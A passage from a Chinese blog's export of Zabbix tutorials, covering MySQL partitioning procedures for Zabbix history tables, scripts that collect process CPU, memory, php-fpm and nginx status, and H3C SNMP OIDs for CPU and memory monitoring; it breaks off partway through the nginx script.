&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改完之后再按照官网上的过程创建四个存储过程： 12345678910111213141516171819202122232425262728293031DELIMITER $$CREATE PROCEDURE `partition_create`(SCHEMANAME VARCHAR(64), TABLENAME VARCHAR(64), PARTITIONNAME VARCHAR(64), CLOCK INT)BEGIN /* SCHEMANAME = The DB schema in which to make changes TABLENAME = The table with partitions to potentially delete PARTITIONNAME = The name of the partition to create */ /* Verify that the partition does not already exist */ DECLARE RETROWS INT; SELECT COUNT(1) INTO RETROWS FROM information_schema.partitions WHERE table_schema = SCHEMANAME AND TABLE_NAME = TABLENAME AND partition_description &gt;= CLOCK; IF RETROWS = 0 THEN /* 1. Print a message indicating that a partition was created. 2. Create the SQL to create the partition. 3. Execute the SQL from #2. */ SELECT CONCAT( "partition_create(", SCHEMANAME, ",", TABLENAME, ",", PARTITIONNAME, ",", CLOCK, ")" ) AS msg; SET @SQL = CONCAT( 'ALTER TABLE ', SCHEMANAME, '.', TABLENAME, ' ADD PARTITION (PARTITION ', PARTITIONNAME, ' VALUES LESS THAN (', CLOCK, '));' ); PREPARE STMT FROM @SQL; EXECUTE STMT; DEALLOCATE PREPARE STMT; END IF;END$$DELIMITER ; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162DELIMITER $$CREATE PROCEDURE `partition_drop`(SCHEMANAME VARCHAR(64), TABLENAME VARCHAR(64), DELETE_BELOW_PARTITION_DATE BIGINT)BEGIN /* SCHEMANAME = The DB schema in which to make changes TABLENAME = The table with partitions to potentially delete DELETE_BELOW_PARTITION_DATE = Delete any partitions with names that are dates older than this one (yyyy-mm-dd) */ DECLARE done INT DEFAULT FALSE; DECLARE drop_part_name VARCHAR(16); /* Get a list of all the partitions that are older than the date in DELETE_BELOW_PARTITION_DATE. All partitions are prefixed with a "p", so use SUBSTRING TO get rid of that character. */ DECLARE myCursor CURSOR FOR SELECT partition_name FROM information_schema.partitions WHERE table_schema = SCHEMANAME AND TABLE_NAME = TABLENAME AND CAST(SUBSTRING(partition_name FROM 2) AS UNSIGNED) &lt; DELETE_BELOW_PARTITION_DATE; DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE; /* Create the basics for when we need to drop the partition. Also, create @drop_partitions to hold a comma-delimited list of all partitions that should be deleted. */ SET @alter_header = CONCAT("ALTER TABLE ", SCHEMANAME, ".", TABLENAME, " DROP PARTITION "); SET @drop_partitions = ""; /* Start looping through all the partitions that are too old. */ OPEN myCursor; read_loop: LOOP FETCH myCursor INTO drop_part_name; IF done THEN LEAVE read_loop; END IF; SET @drop_partitions = IF(@drop_partitions = "", drop_part_name, CONCAT(@drop_partitions, ",", drop_part_name)); END LOOP; IF @drop_partitions != "" THEN /* 1. Build the SQL to drop all the necessary partitions. 2. Run the SQL to drop the partitions. 3. Print out the table partitions that were deleted. */ SET @full_sql = CONCAT(@alter_header, @drop_partitions, ";"); PREPARE STMT FROM @full_sql; EXECUTE STMT; DEALLOCATE PREPARE STMT; SELECT CONCAT(SCHEMANAME, ".", TABLENAME) AS `table`, @drop_partitions AS `partitions_deleted`; ELSE /* No partitions are being deleted, so print out "N/A" (Not applicable) to indicate that no changes were made. */ SELECT CONCAT(SCHEMANAME, ".", TABLENAME) AS `table`, "N/A" AS `partitions_deleted`; END IF;END$$DELIMITER ; 12345678910111213141516171819202122232425262728DELIMITER $$CREATE PROCEDURE `partition_maintenance`(SCHEMA_NAME VARCHAR(32), TABLE_NAME VARCHAR(32), KEEP_DATA_DAYS INT, HOURLY_INTERVAL INT, CREATE_NEXT_INTERVALS INT)BEGIN DECLARE OLDER_THAN_PARTITION_DATE VARCHAR(16); DECLARE PARTITION_NAME VARCHAR(16); DECLARE LESS_THAN_TIMESTAMP INT; DECLARE CUR_TIME INT; CALL partition_verify(SCHEMA_NAME, TABLE_NAME, HOURLY_INTERVAL); SET CUR_TIME = UNIX_TIMESTAMP(DATE_FORMAT(NOW(), '%Y-%m-%d 00:00:00')); SET @__interval = 1; create_loop: LOOP IF @__interval &gt; CREATE_NEXT_INTERVALS THEN LEAVE create_loop; END IF; SET LESS_THAN_TIMESTAMP = CUR_TIME + (HOURLY_INTERVAL * @__interval * 3600); SET PARTITION_NAME = FROM_UNIXTIME(CUR_TIME + HOURLY_INTERVAL * (@__interval - 1) * 3600, 'p%Y%m%d%H00'); CALL partition_create(SCHEMA_NAME, TABLE_NAME, PARTITION_NAME, LESS_THAN_TIMESTAMP); SET @__interval=@__interval+1; END LOOP; SET OLDER_THAN_PARTITION_DATE=DATE_FORMAT(DATE_SUB(NOW(), INTERVAL KEEP_DATA_DAYS DAY), '%Y%m%d0000'); CALL partition_drop(SCHEMA_NAME, TABLE_NAME, OLDER_THAN_PARTITION_DATE); END$$DELIMITER ; 1234567891011121314151617181920212223242526272829303132333435363738DELIMITER $$CREATE PROCEDURE `partition_verify`(SCHEMANAME VARCHAR(64), TABLENAME VARCHAR(64), HOURLYINTERVAL INT(11))BEGIN DECLARE PARTITION_NAME VARCHAR(16); DECLARE RETROWS INT(11); DECLARE FUTURE_TIMESTAMP TIMESTAMP; /* * Check if any partitions exist for the given SCHEMANAME.TABLENAME. */ SELECT COUNT(1) INTO RETROWS FROM information_schema.partitions WHERE table_schema = SCHEMANAME AND TABLE_NAME = TABLENAME AND partition_name IS NULL; /* * If partitions do not exist, go ahead and partition the table */ IF RETROWS = 1 THEN /* * Take the current date at 00:00:00 and add HOURLYINTERVAL to it. This is the timestamp below which we will store values. * We begin partitioning based on the beginning of a day. This is because we don't want to generate a random partition * that won't necessarily fall in line with the desired partition naming (ie: if the hour interval is 24 hours, we could * end up creating a partition now named "p201403270600" when all other partitions will be like "p201403280000"). */ SET FUTURE_TIMESTAMP = TIMESTAMPADD(HOUR, HOURLYINTERVAL, CONCAT(CURDATE(), " ", '00:00:00')); SET PARTITION_NAME = DATE_FORMAT(CURDATE(), 'p%Y%m%d%H00'); -- Create the partitioning query SET @__PARTITION_SQL = CONCAT("ALTER TABLE ", SCHEMANAME, ".", TABLENAME, " PARTITION BY RANGE(`clock`)"); SET @__PARTITION_SQL = CONCAT(@__PARTITION_SQL, "(PARTITION ", PARTITION_NAME, " VALUES LESS THAN (", UNIX_TIMESTAMP(FUTURE_TIMESTAMP), "));"); -- Run the partitioning query PREPARE STMT FROM @__PARTITION_SQL; EXECUTE STMT; DEALLOCATE PREPARE STMT; END IF;END$$DELIMITER ; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面四个存储过程执行后将可以使用 1CALL partition_maintenance('&lt;zabbix_db_name&gt;', '&lt;table_name&gt;', &lt;days_to_keep_data&gt;, &lt;hourly_interval&gt;, &lt;num_future_intervals_to_create&gt;) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令对想要分区的表进行表分区了。其中的参数我这里解释一下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是举例： 1CALL partition_maintenance(zabbix, 'history_uint', 31, 24, 14); zabbix_db_name：库名 table_name：表名 days_to_keep_data：保存多少天的数据 hourly_interval：每隔多久生成一个分区 num_future_intervals_to_create：本次一共生成多少个分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个例子就是history_uint表最多保存31天的数据，每隔24小时生成一个分区，这次一共生成14个分区这里可以将上面四个存储过程保存为一个文件，导入到数据库中，文件我稍后将会放在附件中，这里使用的命令是： 1mysql -uzabbix -pzabbix zabbix&lt;partition_call.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后可以将CALL统一调用也做成一个文件，统一调用的内容如下： 123456789101112DELIMITER $$CREATE PROCEDURE `partition_maintenance_all`(SCHEMA_NAME VARCHAR(32))BEGIN CALL partition_maintenance(SCHEMA_NAME, 'history', 31, 24, 14); CALL partition_maintenance(SCHEMA_NAME, 'history_log', 31, 24, 14); CALL partition_maintenance(SCHEMA_NAME, 'history_str', 31, 24, 14); CALL partition_maintenance(SCHEMA_NAME, 'history_text', 31, 24, 14); CALL partition_maintenance(SCHEMA_NAME, 'history_uint', 31, 24, 14); CALL partition_maintenance(SCHEMA_NAME, 'trends', 180, 24, 14); CALL partition_maintenance(SCHEMA_NAME, 'trends_uint', 180, 24, 14);END$$DELIMITER ; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也将该文件导入到数据库中，使用命令： 1mysql -uzabbix -pzabbix zabbix&lt;partition_all.sql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，到了这里之后就可以使用如下命令执行表分区了： 123456789101112131415161718192021222324252627282930313233343536mysql -uzabbix -pzabbix zabbix -e "CALL partition_maintenance_all('zabbix');"+----------------+--------------------+| table | partitions_deleted |+----------------+--------------------+| zabbix.history | N/A |+----------------+--------------------++--------------------+--------------------+| table | partitions_deleted |+--------------------+--------------------+| zabbix.history_log | N/A |+--------------------+--------------------++--------------------+--------------------+| table | partitions_deleted |+--------------------+--------------------+| zabbix.history_str | N/A |+--------------------+--------------------++---------------------+--------------------+| table | partitions_deleted |+---------------------+--------------------+| zabbix.history_text | N/A |+---------------------+--------------------++---------------------+--------------------+| table | partitions_deleted |+---------------------+--------------------+| zabbix.history_uint | N/A |+---------------------+--------------------++---------------+--------------------+| table | partitions_deleted |+---------------+--------------------+| zabbix.trends | N/A |+---------------+--------------------++--------------------+--------------------+| table | partitions_deleted |+--------------------+--------------------+| zabbix.trends_uint | N/A |+--------------------+--------------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看到如下结果证明所有7张表都进行了表分区，也可以在Mysql的数data目录下看到新生成的表分区文件。（PS:注意，最好是清空history_uint表的数据之后再执行上面这条命令，否则因为这张表数据量太大，转换时间将会好长，清空表中数据的命令为： truncate table history_uint;） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，这样可以进行表分区了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将上面这条命令写入到计划任务中如下： 12crontab -l|tail -101 01 * * * /opt/software/mysql/bin/mysql -uzabbix -pzabbix zabbix -e "CALL partition_maintenance_all('zabbix');" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每天晚上的1点01执行一次。还有之前写的备份数据库的脚本也需要执行计划任务每天的凌晨0点01执行备份： 12crontab -l|tail -2|head -101 00 * * * /usr/local/scripts/Zabbix_MySQLdump_per_table_v2.sh mysqldump &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就大功告成了，之后再体验一下zabbix的web页面看是不是感觉比以前快了？]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix监控进程的CPU和内存占用量]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F17.%20zabbix%E7%9B%91%E6%8E%A7%E8%BF%9B%E7%A8%8B%E7%9A%84CPU%E5%92%8C%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E9%87%8F%2F</url>
    <content type="text"><![CDATA[zabbix监控进程的CPU和内存占用量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要对特定服务进行监控，于是，通过编写脚本获取各个进程占用系统资源的信息，从而使用zabbix采集到这些数据进行特定进程的基础监控。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要需要监控的程序如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx、 redis、 mysql、 tomcat、 sentinel、 mongodb、 openfire、 kafka、 zookeeper、 twemproxy、 mycat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，在agent端编写监控脚本，脚本内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142[zabbix@localhost ~]$ cat zabbix-2.4.4/scripts/processstatus.sh #!/bin/bash#license:GPL#mail:admin@huxianglin.cn#date:2015.06.02nginx()&#123;ps aux|grep "nginx"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;nginxcpu()&#123;ps aux|grep "nginx"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;redis()&#123;ps aux|grep "redis"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;rediscpu()&#123;ps aux|grep "redis"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;mysql()&#123;ps aux|grep "mysql"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;mysqlcpu()&#123;ps aux|grep "mysql"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;tomcat()&#123;ps aux|grep "tomcat"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;tomcatcpu()&#123;ps aux|grep "tomcat"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;sentinel()&#123;ps aux|grep "sentinel"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;sentinelcpu()&#123;ps aux|grep "sentinel"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;mongodb()&#123;ps aux|grep "mongod"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;mongodbcpu()&#123;ps aux|grep "mongod"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;openfire()&#123;ps aux|grep "openfire"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;openfirecpu()&#123;ps aux|grep "openfire"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;kafka()&#123;ps aux|grep "kafka"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;kafkacpu()&#123;ps aux|grep "kafka"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;zookeeper()&#123;ps aux|grep "zookeeper"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;zookeepercpu()&#123;ps aux|grep "zookeeper"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;twemproxy()&#123;ps aux|grep "twemproxy"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;twemproxycpu()&#123;ps aux|grep "twemproxy"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;mycat()&#123;ps aux|grep "mycat"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$6&#125;; END&#123;print sum&#125;'&#125;mycatcpu()&#123;ps aux|grep "mycat"|grep -v "grep"|grep -v "processstatus.sh"|awk '&#123;sum+=$3&#125;; END&#123;print sum&#125;'&#125;case "$1" innginx)nginx;;nginxcpu)nginxcpu;;redis)redis;;rediscpu)rediscpu;;mysql)mysql;;mysqlcpu)mysqlcpu;;tomcat)tomcat;;tomcatcpu)tomcatcpu;;sentinel)sentinel;;sentinelcpu)sentinelcpu;;mongodb)mongodb;;mongodbcpu)mongodbcpu;;openfire)openfire;;openfirecpu)openfirecpu;;kafka)kafka;;kafkacpu)kafkacpu;;zookeeper)zookeeper;;zookeepercpu)zookeepercpu;;twemproxy)twemproxy;;twemproxycpu)twemproxycpu;;mycat)mycat;;mycatcpu)mycatcpu;;*)echo "Usage: $0 &#123;nginx|nginxcpu|redis|rediscpu|mysql|mysqlcpu|tomcat|tomcatcpu|sentinel|sentinelcpu|mongodb|mongodbcpu|openfire|openfirecpu|kafka|kafkacpu|zookeeper|zookeepercpu|twemproxy|twemproxycpu|mycat|mycatcpu&#125;";;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改脚本的权限，使用： 1chmod +x processstatus.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在zabbix_agentd.con配置文件中末尾增加如下代码： 123456789101112131415161718192021222324[zabbix@localhost ~]$ tail -23 zabbix-2.4.4/etc/zabbix_agentd.conf#monitor processUserParameter=process.nginx.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh nginxUserParameter=process.nginx.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh nginxcpuUserParameter=process.redis.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh redisUserParameter=process.redis.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh rediscpuUserParameter=process.mysql.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh mysqlUserParameter=process.mysql.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh mysqlcpuUserParameter=process.tomcat.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh tomcatUserParameter=process.tomcat.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh tomcatcpuUserParameter=process.sentinel.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh sentinelUserParameter=process.sentinel.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh sentinelcpuUserParameter=process.mongodb.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh mongodbUserParameter=process.mongodb.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh mongodbcpuUserParameter=process.openfire.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh openfireUserParameter=process.openfire.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh openfirecpuUserParameter=process.kafka.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh kafkaUserParameter=process.kafka.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh kafkacpuUserParameter=process.zookeeper.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh zookeeperUserParameter=process.zookeeper.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh zookeepercpuUserParameter=process.twemproxy.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh twemproxyUserParameter=process.twemproxy.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh twemproxycpuUserParameter=process.mycat.memory,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh mycatUserParameter=process.mycat.cpu,/home/zabbix/zabbix-2.4.4/scripts/processstatus.sh mycatcpu &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后重启zabbix_agentd服务 12pkill zabbixzabbix-2.4.4/sbin/zabbix_agentd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在zabbix服务端使用zabbix_get看能否取到相应的数据，像下面这样就是成功获取到了数据。 12[root@localhost zabbix-2.4.4]# bin/zabbix_get -s 172.16.1.20 -p 10050 -k process.nginx.memory184876 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，需要在zabbix中定义模板。模板附件链接在下面。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zabbix模板下载 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果模板无法下载可以在附件中下载模板 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要注明的是内存取到的值得单位是KB，所以定义item的时候使用自定义倍数乘以 1000，单位改成Byte，另外CPU占用率的值是带有小数点的一个数，所以在定义item的时 候需要定义值得类型是浮点型，并且该值是占用逻辑单核的CPU占用率，所以需要定义自 定义倍数，我实验中的服务器是2颗CPU，每颗CPU是8核16线程，所以自定义倍数是原来 的基础上除以32，单位改成%就好。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是做好之后的显示效果：]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ZABBIX监控H3C设备的CPU和内存使用率]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F18.%20ZABBIX%E7%9B%91%E6%8E%A7H3C%E8%AE%BE%E5%A4%87%E7%9A%84CPU%E5%92%8C%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8%E7%8E%87%2F</url>
    <content type="text"><![CDATA[ZABBIX监控H3C设备的CPU和内存使用率&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于最近监控的H3C路由器经常出现死机现象，SNMP获取不到数据，后面检查发现是CPU使用率过高，直接导致无法处理SNMP请求，所以需求来了，怎样通过SNMP监控H3C路由器的CPU和内存使用率？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于CPU和内存的IOD号是H3C厂商没有公布的，所以不好找，在网上百度了一些资料查找H3C网络设备的CPU和内存OID号，这里做个记录，以供以后参考。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般H3C网络设备的CPU和内存的IOD号和下面的东西有关。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;H3C cpu 使用率OID：.1.3.6.1.4.1.25506.2.6.1.1.1.1.6.n.1.3.6.1.4.1.2011.10.2.6.1.1.1.1.6.n.1.3.6.1.4.1.2011.10.2.6.1.1.1.1.6.n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;H3C 内存使用率OID：.1.3.6.1.4.1.25506.2.6.1.1.1.1.8.n.1.3.6.1.4.1.2011.10.2.6.1.1.1.1.8.n.1.3.6.1.4.1.2011.10.2.6.1.1.1.1.8.n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，在设备上面使用命令display mib-style查看显示的结果，如果显示的是? new，则需要使用hh3c-entity-ext.mib文件中的hh3cEntityExtCpuUsage节点，该节点的 信息是对象OID .1.3.6.1.4.1.25506.2.6.1.1.1.1.6.n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果显示的是? compatible，则需要使用h3c-entity-ext.mib文件中的 h3cEntityExtCpuUsage节点，该节点的信息是对象OID .1.3.6.1.4.1.2011.10.2.6.1.1.1.1.6.n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至于n的值不同设备不一样，可以使用snmp获取.1.3.6.1.4.1.25506.2.6.1.1.1.1.6的值，其中有一大串输出，其他输出都是0，只有某一个输出是非0的，那个就是CPU的OID号，例如我这的H3C路由器的CPUOID号就是.1.3.6.1.4.1.25506.2.6.1.1.1.1.6.3有非零的值，那么说明.1.3.6.1.4.1.25506.2.6.1.1.1.1.6.3就是CPU的OID号。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内存的OID号判断也是如此，确定了OID号，那么使用zabbix通过snmp监控内存和CPU那就轻而易举了。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix监控php状态]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F16.%20zabbix%E7%9B%91%E6%8E%A7php%E7%8A%B6%E6%80%81%2F</url>
    <content type="text"><![CDATA[zabbix监控php状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过nginx调用php-fpm来查询php的状态信息 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，在php的配置文件中添加一行 1vim /usr/local/php/etc/php-fpm.conf 1pm.status_path = /phpfpmstatus &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后重启php-fpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在nginx配置文件中添加代码 123456789101112131415161718server &#123; listen localhost:80; server_name localhost;location /nginxstatus &#123; stub_status on; access_log off; allow 127.0.0.1; allow 10.6.0.187; deny all; &#125;location ~ ^/(phpfpmstatus)$ &#123; include fastcgi_params; fastcgi_pass unix:/tmp/php-fcgi.sock; fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html$fastcgi_script_name; &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后重启nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后使用curl -s http://localhost/phpfpmstatus查看是否能够获取到php状态信息 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，在zabbix的脚本目录里面编辑执行脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#!/bin/bash#monitor php-fpm status from zabbix#lincense:GPL#mail:admin@huxianglin.cn#date:2015.04.15source /etc/bashrc &gt;/dev/null 2&gt;&amp;1source /etc/profile &gt;/dev/null 2&gt;&amp;1LOG=/usr/local/zabbix-2.4.4/scripts/phpfpmstatus.logcurl -s http://localhost/phpfpmstatus &gt;$LOGpool()&#123; awk '/pool/ &#123;print $NF&#125;' $LOG&#125;process_manager()&#123; awk '/process manager/ &#123;print $NF&#125;' $LOG&#125;start_since()&#123; awk '/start since:/ &#123;print $NF&#125;' $LOG&#125;accepted_conn()&#123; awk '/accepted conn:/ &#123;print $NF&#125;' $LOG&#125;listen_queue()&#123; awk '/^(listen queue:)/ &#123;print $NF&#125;' $LOG&#125;max_listen_queue()&#123; awk '/max listen queue:/ &#123;print $NF&#125;' $LOG&#125;listen_queue_len()&#123; awk '/listen queue len:/ &#123;print $NF&#125;' $LOG&#125;idle_processes()&#123; awk '/idle processes:/ &#123;print $NF&#125;' $LOG&#125;active_processes()&#123; awk '/^(active processes:)/ &#123;print $NF&#125;' $LOG&#125;total_processes()&#123; awk '/total processes:/ &#123;print $NF&#125;' $LOG&#125;max_active_processes()&#123; awk '/max active processes:/ &#123;print $NF&#125;' $LOG&#125;max_children_reached()&#123; awk '/max children reached:/ &#123;print $NF&#125;' $LOG&#125;case "$1" inpool) pool ;;process_manager) process_manager ;;start_since) start_since ;;accepted_conn) accepted_conn ;;listen_queue) listen_queue ;;max_listen_queue) max_listen_queue ;;listen_queue_len) listen_queue_len ;;idle_processes) idle_processes ;;active_processes) active_processes ;;total_processes) total_processes ;;max_active_processes) max_active_processes ;;max_children_reached) max_children_reached ;;*)echo "Usage: $0 &#123;pool|process_manager|start_since|accepted_conn|listen_queue|max_listen_queue|listen_queue_len|idle_processes|active_processes|total_processes|max_active_processes|max_children_reached&#125;"esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后退出，修改权限为 1-rwxr-xr-x 1 zabbix zabbix 1770 4月 15 14:50 phpstatus.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编辑zabbix_agentd.conf文件，在最后添加上下面这段代码，并重启zabbix_agentd服务 12345678910111213#to monitor php-fpmstatusUserParameter=phpfpm.status.pool,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh poolUserParameter=phpfpm.status.process.manager,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh process_managerUserParameter=phpfpm.status.start.since,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh start_sinceUserParameter=phpfpm.status.accepted.conn,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh accepted_connUserParameter=phpfpm.status.listen.queue,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh listen_queueUserParameter=phpfpm.status.max.listen.queue,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh max_listen_queueUserParameter=phpfpm.status.listen.queue.len,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh listen_queue_lenUserParameter=phpfpm.status.idle.processes,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh idle_processesUserParameter=phpfpm.status.active.processes,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh active_processesUserParameter=phpfpm.status.total.processes,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh total_processesUserParameter=phpfpm.status.max.active.processes,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh max_active_processesUserParameter=phpfpm.status.max.children.reached,/usr/local/zabbix-2.4.4/scripts/phpstatus.sh max_children_reached &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后就可以在web端配置item监控php状态了]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix监控nginx状态]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F15.%20zabbix%E7%9B%91%E6%8E%A7nginx%E7%8A%B6%E6%80%81%2F</url>
    <content type="text"><![CDATA[zabbix监控nginx状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，在nginx的配置文件中添加如下一段代码 123456789101112server &#123; listen localhost:80; server_name localhost; location /nginxstatus &#123; stub_status on; access_log off; allow 127.0.0.1; allow 192.168.1.165; deny all; &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存之后重启nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在zabbix脚本目录下创建脚本监控zabbix状态 1cat nginx_status.sh 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/bin/bash # Script to fetch nginx statuses for tribily monitoring systems # Author: admin@huxianglin.cn # License: GPLv2 # Set Variables # Functions to return nginx stats function active &#123;curl -s "http://localhost/nginx_status"| awk '/Active/&#123;print $3&#125;'&#125;function reading &#123;curl -s "http://localhost/nginx_status"| awk '/Reading/&#123;print $2&#125;'&#125;function writing &#123;curl -s "http://localhost/nginx_status"| awk '/Writing/&#123;print $4&#125;'&#125;function waiting &#123;curl -s "http://localhost/nginx_status"| awk '/Waiting/&#123;print $6&#125;'&#125;function accepts &#123;curl -s 